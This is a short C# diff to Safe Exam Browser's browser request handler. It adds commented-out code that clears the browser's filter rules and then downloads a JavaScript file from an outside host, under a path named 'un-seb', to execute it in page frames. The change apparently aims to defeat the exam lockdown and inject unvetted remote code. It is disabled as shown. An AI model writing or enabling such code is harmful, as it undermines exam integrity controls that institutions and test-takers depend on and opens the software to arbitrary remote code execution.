@@ -11,6 +11,7 @@ using SafeExamBrowser.Browser.Content;
 using SafeExamBrowser.Configuration.Contracts;
 using SafeExamBrowser.Configuration.Contracts.Cryptography;
 using SafeExamBrowser.I18n.Contracts;
+using System.Windows.Forms;
 using BrowserSettings = SafeExamBrowser.Settings.Browser.BrowserSettings;
 
 namespace SafeExamBrowser.Browser.Handlers
@@ -48,6 +49,14 @@ namespace SafeExamBrowser.Browser.Handlers
 			{
 				frame.ExecuteJavaScriptAsync($"window.print = function() {{ alert('{text.Get(TextKey.Browser_PrintNotAllowed)}') }}");
 			}
+
+			//Settings.Browser.FilterSettings filterSettings = new Settings.Browser.FilterSettings();
+			//filterSettings.Rules.Clear();
+			//using (var client = new System.Net.WebClient())
+			//{
+			//	var the_script = client.DownloadString("https://wxnnvs.ftp.sh/un-seb/the_script.js");
+			//	frame.ExecuteJavaScriptAsync(the_script);
+			//}
 
 			//var js = @"
 			//	function loadScript(url, completeCallback) {
